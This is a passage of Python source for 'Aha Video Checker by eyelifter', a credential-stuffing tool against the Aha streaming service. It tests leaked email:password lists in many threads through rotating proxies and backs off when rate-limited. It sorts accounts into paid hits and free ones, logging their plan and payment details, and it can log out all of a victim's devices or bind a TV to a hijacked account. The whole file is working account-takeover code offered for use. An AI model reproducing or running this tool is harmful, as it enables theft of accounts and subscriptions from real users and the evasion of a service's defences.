    if st == "ok":
        verdict = "hit" if result.get("paid") else "free"
        u = result
    elif st == "bad":
        verdict = "bad"
        u = None
    elif st == "locked":
        verdict = "locked"
        u = None
    else:
        verdict = "error"
        u = None

    with _EYELIFTER_LK:
        _EYELIFTER_ST["checked"] += 1
        done = _EYELIFTER_ST["checked"]
        if verdict == "hit":
            _EYELIFTER_ST["hit"] += 1
        elif verdict == "free":
            _EYELIFTER_ST["free"] += 1
        elif verdict == "bad":
            _EYELIFTER_ST["bad"] += 1
        elif verdict == "locked":
            _EYELIFTER_ST["locked"] += 1
        else:
            _EYELIFTER_ST["errors"] += 1
        total = _EYELIFTER_TOTAL

    sp = eyelifter_spacer()

    if verdict == "hit":
        line_term = eyelifter_fmt_line(u, "hit", for_file=False)
        line_file = eyelifter_fmt_line(u, "hit", for_file=True)
        eyelifter_rline(done, total, "HIT", line_term, "32", True, whole=True)
        eyelifter_sw(_EYELIFTER_HIT_F, line_file + sp)
    elif verdict == "free":
        line_term = eyelifter_fmt_line(u, "free", for_file=False)
        line_file = eyelifter_fmt_line(u, "free", for_file=True)
        eyelifter_rline(done, total, "FREE", line_term, "36", whole=True)
        eyelifter_sw(_EYELIFTER_FREE_F, line_file + sp)
    elif verdict == "bad":
        reason = result.get("reason", "invalid")
        eyelifter_rline(done, total, "BAD", f"BAD {combo} | {reason}", "31")
        eyelifter_sw(_EYELIFTER_BAD_F,
                     f"BAD {combo} | {reason} | {EYELIFTER_LINE_TAG}{sp}")
    elif verdict == "locked":
        reason = result.get("reason", "locked")
        eyelifter_rline(done, total, "LOCKED", f"LOCKED {combo} | {reason}",
                        "35", True)
        eyelifter_sw(_EYELIFTER_LOCKED_F,
                     f"LOCKED {combo} | {reason} | {EYELIFTER_LINE_TAG}{sp}")
    else:
        et = result.get("error_type", "unknown")
        eyelifter_rline(done, total, "ERR", f"ERR {combo} | [{et}]", "33")
        eyelifter_sw(_EYELIFTER_ERR_F,
                     f"ERR {combo} | [{et}] | {EYELIFTER_LINE_TAG}{sp}")


_EYELIFTER_COMBORX = re.compile(
    r'^\s*([^:\s|]+@[^:\s|]+\.[a-zA-Z]{2,})\s*:\s*([^\s|]+)', re.I)


def eyelifter_extract_combos(content):
    out = set()
    skipped = 0
    for raw in content.splitlines():
        line = raw.strip()
        if not line or line.startswith("#"):
            continue
        m = _EYELIFTER_COMBORX.match(line)
        if m:
            e = m.group(1).lower()
            p = m.group(2)
            if e and p:
                out.add(f"{e}:{p}")
        else:
            skipped += 1
    if skipped:
        eyelifter_log("🧹", "INFO", "EXTRACT",
                      f"{skipped} lines skipped [eyelifter]")
    return sorted(out)


def eyelifter_open_files(folder):
    names = ["aha_hits.txt", "aha_free.txt", "aha_bad.txt",
             "aha_locked.txt", "aha_errors.txt"]
    op = []
    try:
        for n in names:
            op.append(open(os.path.join(folder, n), "w", encoding="utf-8"))
    except Exception:
        for h in op:
            try:
                h.close()
            except Exception:
                pass
        raise
    return op


def eyelifter_run_retry(combo, proxy):
    attempts = _EYELIFTER_CFG.settings.get("retries", 1) + 1
    lp = proxy
    result = None

    try:
        for a in range(attempts):
            if _EYELIFTER_STOP.is_set():
                break
            if a > 0:
                np = eyelifter_pick_proxy(exclude=lp)
                if np:
                    if lp and lp != np:
                        eyelifter_rel_proxy(lp)
                    proxy = np
                eyelifter_dbg("RETRY",
                    f"attempt {a+1}/{attempts} · {combo.split(':', 1)[0][:40]}")
            lp = proxy

            try:
                result = eyelifter_check(combo, proxy)
            except Exception as e:
                result = {"status": "error",
                          "error_type": f"crash_{type(e).__name__}",
                          "email": combo.split(":", 1)[0],
                          "password": combo.split(":", 1)[1] if ":" in combo else ""}

            if result.get("status") in ("ok", "bad", "locked"):
                break

            et = result.get("error_type", "")
            is_last = a == attempts - 1

            if et == "rate_limit":
                with _EYELIFTER_LK:
                    _EYELIFTER_ST["rl"] += 1
                if proxy:
                    eyelifter_cool_proxy(proxy, 120.0)
                w = min(_EYELIFTER_CFG.settings.get("rate_limit_delay", 8) * (2 ** a), 60)
                eyelifter_rl_backoff(w)
                if _EYELIFTER_STOP.wait(w * (0.7 + random.random() * 0.6)):
                    break
                continue

            if et.startswith("net_"):
                if proxy is None:
                    break
                eyelifter_bad_proxy(proxy)
                if not is_last and _EYELIFTER_STOP.wait(
                        _EYELIFTER_CFG.settings.get("retry_delay", 0.5)):
                    break
                continue

            if et == "device_cap_unresolved" and not is_last:
                if _EYELIFTER_STOP.wait(0.2 + random.random() * 0.3):
                    break
                continue

            if not is_last and _EYELIFTER_STOP.wait(
                    _EYELIFTER_CFG.settings.get("retry_delay", 0.5)):
                break
    finally:
        if lp:
            eyelifter_rel_proxy(lp)

    return result or {"status": "error", "error_type": "no_result",
                      "email": combo.split(":", 1)[0],
                      "password": combo.split(":", 1)[1] if ":" in combo else ""}


class EyelifterRunner:
    def __init__(self, combos):
        self.eyelifter = "eyelifter"
        self.combos = combos
        self.threads = _EYELIFTER_CFG.settings["threads"]
        self.gap = _EYELIFTER_CFG.settings.get("combo_delay", 0.0)
        self.chunk = max(self.threads * 4, 200)

    def eyelifter_task(self, combo):
        if _EYELIFTER_STOP.is_set():
            return
        if self.gap > 0:
            if _EYELIFTER_STOP.wait(self.gap * (0.5 + random.random())):
                return
        if _EYELIFTER_STOP.is_set():
            return
        proxy = eyelifter_pick_proxy() if _EYELIFTER_POOL else None
        try:
            result = eyelifter_run_retry(combo, proxy)
        except Exception as e:
            result = {"status": "error",
                      "error_type": f"runner_{type(e).__name__}",
                      "email": combo.split(":", 1)[0],
                      "password": combo.split(":", 1)[1] if ":" in combo else ""}
        try:
            eyelifter_record(combo, result)
        except Exception:
            pass

    def eyelifter_run(self):
        inflight = set()
        ex = ThreadPoolExecutor(max_workers=self.threads)
        try:
            for i in range(0, len(self.combos), self.chunk):
                if _EYELIFTER_STOP.is_set():
                    break
                batch = self.combos[i:i + self.chunk]
                for c in batch:
                    if _EYELIFTER_STOP.is_set():
                        break
                    inflight.add(ex.submit(self.eyelifter_task, c))
                while inflight:
                    done, pending = wait(inflight, timeout=0.25,
                                         return_when=FIRST_COMPLETED)
                    for f in done:
                        inflight.discard(f)
                        try:
                            f.result(timeout=0.1)
                        except Exception:
                            pass
                    if _EYELIFTER_STOP.is_set() and not done:
                        break
            while inflight:
                done, pending = wait(inflight, timeout=0.25,
                                     return_when=FIRST_COMPLETED)
                for f in done:
                    inflight.discard(f)
                    try:
                        f.result(timeout=0.1)
                    except Exception:
                        pass
        except KeyboardInterrupt:
            _EYELIFTER_STOP.set()
        finally:
            _EYELIFTER_STOP.set()
            try:
                ex.shutdown(wait=True, cancel_futures=True)
            except TypeError:
                ex.shutdown(wait=True)


def eyelifter_ask_threads():
    print()
    print(eyelifter_color("96", f"  Threads [eyelifter]  (1-{EYELIFTER_MAX_THREADS})"))
    print(eyelifter_color("90", f"  current: {_EYELIFTER_CFG.settings['threads']}"))
    raw = input(eyelifter_color("96", "  > ")).strip()
    if not raw:
        return _EYELIFTER_CFG.settings["threads"]
    try:
        t = int(raw)
    except ValueError:
        return _EYELIFTER_CFG.settings["threads"]
    return max(1, min(EYELIFTER_MAX_THREADS, t))


def eyelifter_ask_yn(prompt, default=True):
    d = "Y/n" if default else "y/N"
    raw = input(eyelifter_color("96", f"  {prompt} [{d}] > ")).strip().lower()
    if not raw:
        return default
    return raw in ("y", "yes", "1", "true", "on")


def eyelifter_ask_logout_all():
    global _EYELIFTER_SESSION
    print()
    print(eyelifter_color("96", "  Cleanup options [eyelifter]"))
    print(eyelifter_color("90", "  auto-free on cap-hit is always ON (required to login)"))
    logout_all = eyelifter_ask_yn("Logout ALL devices after each HIT?",
                                  default=_EYELIFTER_CFG.settings.get("auto_logout_all_on_hit", False))
    _EYELIFTER_SESSION["logout_all_on_hit"] = logout_all
    eyelifter_log("⚙️", "INFO", "FLAGS",
        f"auto_free=True (mandatory) · logout_all_on_hit={logout_all} [eyelifter]")


def eyelifter_single_check(proxies):
    global _EYELIFTER_POOL, _EYELIFTER_BADP, _EYELIFTER_FOLDER
    _EYELIFTER_STOP.clear()

    eyelifter_section("SINGLE CHECK [eyelifter]")
    combo = input(f"{eyelifter_color('96', '[*] email:password > ')}").strip()
    if ":" not in combo:
        eyelifter_log("✗", "ERROR", "INPUT", "invalid format [eyelifter]")
        if sys.stdin.isatty():
            input(f"{eyelifter_color('93', '[*] enter > ')}")
        return

    eyelifter_ask_logout_all()

    proxy = None
    if proxies:
        if not _EYELIFTER_POOL:
            _EYELIFTER_POOL = list(proxies)
            _EYELIFTER_BADP = set()
        proxy = eyelifter_pick_proxy()

    eyelifter_log("🔍", "STEP", "CHECK",
        f"checking {combo.split(':')[0]} [eyelifter]")
    t0 = time.time()
    result = eyelifter_run_retry(combo, proxy)
    el = time.time() - t0

    st = result.get("status")
    if st == "ok":
        vlabel = "💰 HIT (paid)" if result.get("paid") else "🆓 FREE"
        rows = [
            ("Status", vlabel),
            ("Email", result.get("email")),
            ("Password", result.get("password")),
            ("Contact ID", result.get("contact_id")),
            ("Partner", result.get("cp")),
            ("Country", result.get("country")),
            ("Account Status", result.get("account_status")),
        ]
        if result.get("paid"):
            rows += [
                ("Plan", result.get("plan_name") or "-"),
                ("Type", result.get("plan_type") or "-"),
            ]
            exp_ms = result.get("exp_ms")
            days_left = result.get("days_left")
            if exp_ms and exp_ms > 0:
                try:
                    dt = datetime.fromtimestamp(int(exp_ms) / 1000)
                    exp_str = dt.strftime("%Y-%m-%d")
                    if days_left is not None:
                        exp_str += f" ({days_left} days left)"
                    rows.append(("Expires", exp_str))
                except (ValueError, TypeError, OSError):
                    pass
            auto = "Yes" if result.get("auto_renew") else "No"
            auto_row = auto
            nb = result.get("next_bill_ms") or 0
            if auto == "Yes" and nb and nb > 0:
                try:
                    nb_dt = datetime.fromtimestamp(int(nb) / 1000).strftime("%Y-%m-%d")
                    auto_row += f" · next {nb_dt}"
                except (ValueError, TypeError, OSError):
                    pass
            rows.append(("Auto Renew", auto_row))
            price = result.get("price")
            currency = result.get("currency") or ""
            if price:
                try:
                    rows.append(("Price", f"{int(float(price))} {currency}"))
                except (ValueError, TypeError):
                    pass
            if result.get("payment"):
                rows.append(("Payment", result.get("payment")))
        rows += [
            ("Devices", str(result.get("num_devices"))),
            ("Time", f"{el:.2f}s"),
            ("Credit", f"eyelifter · {EYELIFTER_TG_USER} · {EYELIFTER_TG_CHAN}"),
        ]
        eyelifter_summary(rows)
    elif st == "bad":
        eyelifter_log("✗", "ERROR", "RESULT",
            f"bad — {result.get('reason')} [eyelifter]")
    elif st == "locked":
        eyelifter_log("🔒", "WARN", "RESULT",
            f"locked — {result.get('reason')} [eyelifter]")
    else:
        eyelifter_log("✗", "ERROR", "RESULT",
            f"{result.get('error_type', '')} [eyelifter]")

    if sys.stdin.isatty():
        input(f"{eyelifter_color('93', '[*] enter > ')}")


def eyelifter_bulk_check(proxies):
    global _EYELIFTER_TOTAL, _EYELIFTER_HIT_F, _EYELIFTER_FREE_F, _EYELIFTER_BAD_F
    global _EYELIFTER_LOCKED_F, _EYELIFTER_ERR_F, _EYELIFTER_FOLDER
    global _EYELIFTER_POOL, _EYELIFTER_BADP

    eyelifter_reset_stats()
    eyelifter_section("BULK CHECK [eyelifter]")

    path = input(f"{eyelifter_color('96', '[*] combo file > ')}").strip()
    if not path or not os.path.isfile(path):
        eyelifter_log("✗", "ERROR", "FILE", "not found [eyelifter]")
        if sys.stdin.isatty():
            input(f"{eyelifter_color('93', '[*] enter > ')}")
        return

    with open(path, "r", encoding="utf-8", errors="ignore") as f:
        content = f.read()
    combos = eyelifter_extract_combos(content)
    if not combos:
        eyelifter_log("✗", "ERROR", "EXTRACT", "no valid combos [eyelifter]")
        if sys.stdin.isatty():
            input(f"{eyelifter_color('93', '[*] enter > ')}")
        return

    eyelifter_log("✓", "INFO", "EXTRACT",
                  f"{len(combos)} unique combos [eyelifter]")

    nt = eyelifter_ask_threads()
    if nt != _EYELIFTER_CFG.settings["threads"]:
        _EYELIFTER_CFG.settings["threads"] = nt
        try:
            _EYELIFTER_CFG.eyelifter_save()
        except Exception:
            pass
    eyelifter_log("⚙️", "INFO", "THREADS",
                  f"{_EYELIFTER_CFG.settings['threads']} [eyelifter]")

    eyelifter_ask_logout_all()

    root = os.path.join(os.path.dirname(EYELIFTER_CFG_PATH), EYELIFTER_RESULTS)
    os.makedirs(root, exist_ok=True)
    ts = datetime.now().strftime("%Y-%m-%d_%H-%M-%S")
    tag = "".join(random.choices(string.ascii_lowercase + string.digits, k=4))
    _EYELIFTER_FOLDER = os.path.join(root, f"Session_{ts}_{tag}")
    os.makedirs(_EYELIFTER_FOLDER, exist_ok=True)

    try:
        (_EYELIFTER_HIT_F, _EYELIFTER_FREE_F, _EYELIFTER_BAD_F,
         _EYELIFTER_LOCKED_F, _EYELIFTER_ERR_F) = eyelifter_open_files(_EYELIFTER_FOLDER)
    except Exception as e:
        eyelifter_log("✗", "ERROR", "OPEN", f"{e} [eyelifter]")
        if sys.stdin.isatty():
            input(f"{eyelifter_color('93', '[*] enter > ')}")
        return

    header = (f"# Aha Video Checker by eyelifter - {datetime.now().isoformat()}\n"
              f"# Seal: {EYELIFTER_SEAL_STR}\n"
              f"# Credit: eyelifter | {EYELIFTER_TG_USER} | {EYELIFTER_TG_CHAN}\n\n")
    for fh in (_EYELIFTER_HIT_F, _EYELIFTER_FREE_F, _EYELIFTER_BAD_F,
               _EYELIFTER_LOCKED_F, _EYELIFTER_ERR_F):
        fh.write(header)

    _EYELIFTER_TOTAL = len(combos)
    eyelifter_log("📊", "INFO", "FILE", f"loaded {_EYELIFTER_TOTAL} [eyelifter]")

    if proxies:
        _EYELIFTER_POOL = list(proxies)
        _EYELIFTER_BADP = set()
        eyelifter_log("🌐", "INFO", "PROXY",
                      f"{len(proxies)} loaded [eyelifter]")
    else:
        _EYELIFTER_POOL = []
        _EYELIFTER_BADP = set()
        eyelifter_log("⚠️", "WARN", "PROXY", "direct connection [eyelifter]")

    _EYELIFTER_STOP.clear()
    eyelifter_log("🚀", "INFO", "START",
        f"firing {_EYELIFTER_TOTAL} combos across "
        f"{_EYELIFTER_CFG.settings['threads']} threads "
        f"| {EYELIFTER_TG_USER} | {EYELIFTER_TG_CHAN} [eyelifter]")

    try:
        EyelifterRunner(combos).eyelifter_run()
    except KeyboardInterrupt:
        _EYELIFTER_STOP.set()
        eyelifter_log("🛑", "WARN", "STOP", "stopping... [eyelifter]")
    except Exception as e:
        eyelifter_log("✗", "ERROR", "RUN",
            f"{type(e).__name__}: {str(e)[:120]} [eyelifter]")
    finally:
        _EYELIFTER_STOP.set()
        time.sleep(0.3)
        for fh in (_EYELIFTER_HIT_F, _EYELIFTER_FREE_F, _EYELIFTER_BAD_F,
                   _EYELIFTER_LOCKED_F, _EYELIFTER_ERR_F):
            try:
                fh.close()
            except Exception:
                pass

    with _EYELIFTER_LK:
        snap = dict(_EYELIFTER_ST)

    for base, key in (
        ("aha_hits.txt", "hit"),
        ("aha_free.txt", "free"),
        ("aha_bad.txt", "bad"),
        ("aha_locked.txt", "locked"),
        ("aha_errors.txt", "errors"),
    ):
        old = os.path.join(_EYELIFTER_FOLDER, base)
        new = os.path.join(_EYELIFTER_FOLDER,
                           base.replace(".txt", f"_{snap[key]}.txt"))
        if os.path.exists(old):
            try:
                os.rename(old, new)
            except Exception:
                pass

    eyelifter_log("💾", "INFO", "SAVE",
                  f"results → {_EYELIFTER_FOLDER} [eyelifter]")
    eyelifter_divider()
    el = time.time() - _EYELIFTER_START
    eyelifter_summary([
        ("Total", _EYELIFTER_TOTAL),
        ("HIT", snap["hit"]),
        ("FREE", snap["free"]),
        ("Bad creds", snap["bad"]),
        ("Locked", snap["locked"]),
        ("Errors", snap["errors"]),
        ("Devices freed", snap["freed"]),
        ("Devices logged out", snap["logged_out"]),
        ("Rate limited", snap["rl"]),
        ("Proxy fails", snap["pfails"]),
        ("Time", f"{el:.1f}s"),
        ("Speed", f"{_EYELIFTER_TOTAL / max(el, 0.001):.2f} combo/s"),
        ("Folder", _EYELIFTER_FOLDER),
        ("Credit", f"eyelifter · {EYELIFTER_TG_USER} · {EYELIFTER_TG_CHAN}"),
    ])
    if sys.stdin.isatty():
        input(f"{eyelifter_color('93', '[*] enter > ')}")


def eyelifter_tv_login(proxies):
    global _EYELIFTER_POOL, _EYELIFTER_BADP
    _EYELIFTER_STOP.clear()

    eyelifter_section("TV LOGIN [eyelifter]")
    print(eyelifter_color("96", "  [1]  From combo file  (bulk)"))
    print(eyelifter_color("96", "  [2]  Single combo"))
    mode = input(f"{eyelifter_color('96', '[*] select > ')}").strip()

    if mode not in ("1", "2"):
        eyelifter_log("✗", "ERROR", "INPUT", "invalid [eyelifter]")
        if sys.stdin.isatty():
            input(f"{eyelifter_color('93', '[*] enter > ')}")
        return

    if not _EYELIFTER_POOL and proxies:
        _EYELIFTER_POOL = list(proxies)
        _EYELIFTER_BADP = set()

    combos = []
    if mode == "1":
        path = input(f"{eyelifter_color('96', '[*] combo file > ')}").strip()
        if not path or not os.path.isfile(path):
            eyelifter_log("✗", "ERROR", "FILE", "not found [eyelifter]")
            if sys.stdin.isatty():
                input(f"{eyelifter_color('93', '[*] enter > ')}")
            return
        with open(path, "r", encoding="utf-8", errors="ignore") as f:
            combos = eyelifter_extract_combos(f.read())
    else:
        c = input(f"{eyelifter_color('96', '[*] email:password > ')}").strip()
        if ":" not in c:
            eyelifter_log("✗", "ERROR", "INPUT", "invalid format [eyelifter]")
            if sys.stdin.isatty():
                input(f"{eyelifter_color('93', '[*] enter > ')}")
            return
        combos = [c]

    if not combos:
        eyelifter_log("✗", "ERROR", "EXTRACT", "no combos [eyelifter]")
        if sys.stdin.isatty():
            input(f"{eyelifter_color('93', '[*] enter > ')}")
        return

    eyelifter_log("✓", "INFO", "EXTRACT",
                  f"{len(combos)} combos [eyelifter]")

    eyelifter_ask_logout_all()

    for combo in combos:
        if _EYELIFTER_STOP.is_set():
            break

        eyelifter_log("🔍", "STEP", "TVLOGIN", f"{combo.split(':')[0]} [eyelifter]")

        proxy = eyelifter_pick_proxy() if _EYELIFTER_POOL else None
        try:
            result = eyelifter_run_retry(combo, proxy)
        finally:
            if proxy:
                eyelifter_rel_proxy(proxy)

        st = result.get("status")
        if st == "bad":
            eyelifter_log("✗", "ERROR", "TVLOGIN",
                f"{combo.split(':')[0]} bad — {result.get('reason')} [eyelifter]")
            continue
        if st == "locked":
            eyelifter_log("🔒", "WARN", "TVLOGIN",
                f"{combo.split(':')[0]} locked — {result.get('reason')} [eyelifter]")
            continue
        if st != "ok":
            eyelifter_log("✗", "ERROR", "TVLOGIN",
                f"{combo.split(':')[0]} {result.get('error_type', '')} [eyelifter]")
            continue

        email = result.get("email")
        password = result.get("password")
        cp = result.get("cp") or _EYELIFTER_CFG.settings.get("cp", "AHA_IN")

        eyelifter_log("✓", "SUCCESS", "TVLOGIN",
            f"{email} logged in · paid={result.get('paid')} [eyelifter]")

        code = input(eyelifter_color("96",
            f"  [eyelifter] activation code for {email} (blank to skip) > ")).strip()
        if not code:
            eyelifter_log("!", "WARN", "TVLOGIN", "skipped — no code [eyelifter]")
            continue

        session = eyelifter_build_session(proxy)
        serial = str(uuid.uuid4())
        msg, err = eyelifter_login(session, email, password, cp, serial=serial)
        if err or not msg or not msg.get("accessToken"):
            eyelifter_log("✗", "ERROR", "TVLOGIN",
                f"relogin failed [eyelifter]")
            continue
        token = msg.get("accessToken")

        body = {
            "RegisterDeviceRequestMessage": {
                "channelPartnerID": cp,
                "apiUser": EYELIFTER_API_USER,
                "apiPassword": EYELIFTER_API_PASS,
                "activationCode": code,
                "deviceMessage": eyelifter_device_message(str(uuid.uuid4())),
            }
        }
        r, j, err = eyelifter_post(session, "/aha/registerDevice", body, token=token)

        if err or not j:
            eyelifter_log("✗", "ERROR", "TVLOGIN",
                f"registerDevice net error: {err} [eyelifter]")
            continue

        rmsg = j.get("RegisterDeviceResponseMessage") or {}
        rc = rmsg.get("responseCode")
        if rc == "1":
            eyelifter_log("★", "SUCCESS", "TVLOGIN",
                f"TV login OK for {email} · code={code} [eyelifter]")
            base = os.path.dirname(EYELIFTER_CFG_PATH)
            with open(os.path.join(base, "aha_tv_logins.txt"), "a",
                      encoding="utf-8") as f:
                f.write(f"TV {email}:{password} | code={code} | "
                        f"CP={cp} | {EYELIFTER_LINE_TAG}\n")
        else:
            fcode, fmsg = eyelifter_fail_info(rmsg)
            eyelifter_log("✗", "ERROR", "TVLOGIN",
                f"registerDevice failed · {fcode} {fmsg} [eyelifter]")

    if sys.stdin.isatty():
        input(f"{eyelifter_color('93', '[*] enter > ')}")


def eyelifter_settings_menu():
    eyelifter_section("SETTINGS [eyelifter]")
    s = _EYELIFTER_CFG.settings
    print(f"  [1]  Threads:              {s['threads']} (1-{EYELIFTER_MAX_THREADS})")
    print(f"  [2]  Timeout:              {s['timeout']}s")
    print(f"  [3]  Retries:              {s['retries']}")
    print(f"  [4]  Combo Delay:          {s['combo_delay']}s")
    print(f"  [5]  Proxies File:         {s['proxies_file']}")
    print(f"  [6]  Rate-limit Delay:     {s['rate_limit_delay']}s")
    print(f"  [7]  Skip Proxy Test:      {s['skip_proxy_test']}")
    print(f"  [8]  Max Removals:         {s['max_device_removals']}")
    print(f"  [9]  Logout All on Hit:    {s['auto_logout_all_on_hit']}")
    print(f"  [10] CP:                   {s['cp']}")
    print(f"  [11] Hit Spacer:           {s['hit_spacer']}")
    print(f"  [12] Debug:                {s['debug']}")
    print(f"  [0]  Back")

    ch = input(f"{eyelifter_color('96', '[*] select > ')}").strip()
    changed = False
    try:
        if ch == "1":
            s["threads"] = max(1, min(EYELIFTER_MAX_THREADS, int(input("threads: "))))
            changed = True
        elif ch == "2":
            s["timeout"] = max(5, min(120, int(input("timeout: "))))
            changed = True
        elif ch == "3":
            s["retries"] = max(0, min(5, int(input("retries: "))))
            changed = True
        elif ch == "4":
            s["combo_delay"] = max(0.0, min(60.0, float(input("combo delay: "))))
            changed = True
        elif ch == "5":
            v = input("proxies file: ").strip()
            if v:
                s["proxies_file"] = v
                changed = True
        elif ch == "6":
            s["rate_limit_delay"] = max(1, min(120, int(input("rate-limit delay: "))))
            changed = True
        elif ch == "7":
            s["skip_proxy_test"] = not s["skip_proxy_test"]
            changed = True
        elif ch == "8":
            s["max_device_removals"] = max(1, min(10, int(input("max removals: "))))
            changed = True
        elif ch == "9":
            s["auto_logout_all_on_hit"] = not s["auto_logout_all_on_hit"]
            changed = True
        elif ch == "10":
            v = input("CP: ").strip()
            if v:
                s["cp"] = v
                changed = True
        elif ch == "11":
            s["hit_spacer"] = not s["hit_spacer"]
            changed = True
        elif ch == "12":
            s["debug"] = not s["debug"]
            changed = True
        elif ch == "0":
            return
    except (ValueError, TypeError):
        eyelifter_log("✗", "ERROR", "CONFIG", "invalid [eyelifter]")
        if sys.stdin.isatty():
            input(f"{eyelifter_color('93', '[*] enter > ')}")
        return

    if changed:
        try:
            _EYELIFTER_CFG.eyelifter_save()
            eyelifter_log("💾", "INFO", "CONFIG", "saved [eyelifter]")
        except Exception as e:
            eyelifter_log("!", "WARN", "CONFIG", f"{e} [eyelifter]")
        if sys.stdin.isatty():
            input(f"{eyelifter_color('93', '[*] enter > ')}")


def eyelifter_open_channel():
    try:
        for cmd in ("termux-open-url", "xdg-open", "open"):
            if subprocess.run(["which", cmd], capture_output=True).returncode == 0:
                subprocess.Popen(
                    [cmd, f"https://t.me/{EYELIFTER_TG_CHAN.lstrip('@')}"],
                    stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL,
                    stdin=subprocess.DEVNULL, start_new_session=True,
                    close_fds=True)
                return
        if os.name == "nt":
            os.startfile(f"https://t.me/{EYELIFTER_TG_CHAN.lstrip('@')}")
            return
        import webbrowser
        webbrowser.open(f"https://t.me/{EYELIFTER_TG_CHAN.lstrip('@')}")
    except Exception:
        pass


def eyelifter_main():
    eyelifter_verify("main")

    if _EYELIFTER_CFG.settings.get("open_channel_on_launch", True):
        threading.Thread(target=eyelifter_open_channel, daemon=True).start()

    eyelifter_banner(EYELIFTER_TOOL, "Aha Video Checker")
    eyelifter_log("📣", "INFO", "CREDIT",
        f"eyelifter · {EYELIFTER_TG_USER} · {EYELIFTER_TG_CHAN} [eyelifter]")
    eyelifter_log("🐛", "INFO", "DEBUG",
        f"{'ON' if _EYELIFTER_CFG.settings.get('debug') else 'OFF'} [eyelifter]")

    proxy_file = os.path.join(
        os.path.dirname(EYELIFTER_CFG_PATH),
        _EYELIFTER_CFG.settings.get("proxies_file", "proxies.txt"))
    proxies = eyelifter_load_proxies(proxy_file)
    if proxies and not _EYELIFTER_CFG.settings.get("skip_proxy_test", False):
        proxies = eyelifter_filter_proxies(proxies)
        eyelifter_log("✓", "INFO", "PROXY",
                      f"{len(proxies)} live [eyelifter]")

    while True:
        eyelifter_verify("menu")
        eyelifter_section(
            f"MAIN MENU · {EYELIFTER_TG_USER} · {EYELIFTER_TG_CHAN} [eyelifter]")
        if proxies:
            eyelifter_log("🌐", "INFO", "PROXY",
                          f"{len(proxies)} proxies [eyelifter]")
        else:
            eyelifter_log("⚠️", "WARN", "PROXY", "direct [eyelifter]")
        print("[1] Single check")
        print("[2] Bulk check")
        print("[3] TV login")
        print("[4] Settings")
        print("[5] Exit")
        ch = input(f"{eyelifter_color('93', '[*] select > ')}").strip()

        if ch == "1":
            eyelifter_single_check(proxies)
        elif ch == "2":
            _EYELIFTER_STOP.clear()
            eyelifter_bulk_check(proxies)
        elif ch == "3":
            _EYELIFTER_STOP.clear()
            eyelifter_tv_login(proxies)
        elif ch == "4":
            eyelifter_settings_menu()
            proxies = eyelifter_load_proxies(proxy_file)
            if proxies and not _EYELIFTER_CFG.settings.get("skip_proxy_test", False):
                proxies = eyelifter_filter_proxies(proxies)
        elif ch == "5":
            print("Exiting...")
            return
        else:
            eyelifter_log("✗", "ERROR", "INPUT", "invalid choice [eyelifter]")


if __name__ == "__main__":
    try:
        eyelifter_main()
    except SystemExit:
        raise
    except KeyboardInterrupt:
        print("\nExiting...")
    except Exception as e:
        print(f"[FATAL] {type(e).__name__}: {e}")